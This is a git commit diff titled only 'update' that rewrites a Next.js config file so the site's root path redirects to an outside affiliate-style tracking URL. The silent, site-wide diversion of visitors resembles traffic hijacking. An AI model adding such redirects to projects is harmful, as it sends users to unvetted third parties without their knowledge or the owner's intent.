b23b47ea1129d4a2ce9db86a73ed58bf7c19a046
CATF <azanlastman@gmail.com>
2025-12-26 03:56:35 +0700

    update

--- next.config.ts
+++ next.config.ts
@@ -1,7 +1,11 @@
-import type { NextConfig } from "next";
-
-const nextConfig: NextConfig = {
-  /* config options here */
-};
-
-export default nextConfig;
+module.exports = {
+  async redirects() {
+    return [
+      {
+        source: '/',
+        destination: 'https://t.crjmpx.com/322477/3785/0?bo=2753,2754,2755,2756&target=domainredirects&po=6456&aff_sub5=SF_006OG000004lmDN',
+        permanent: false,
+      },
+    ]
+  },
+}
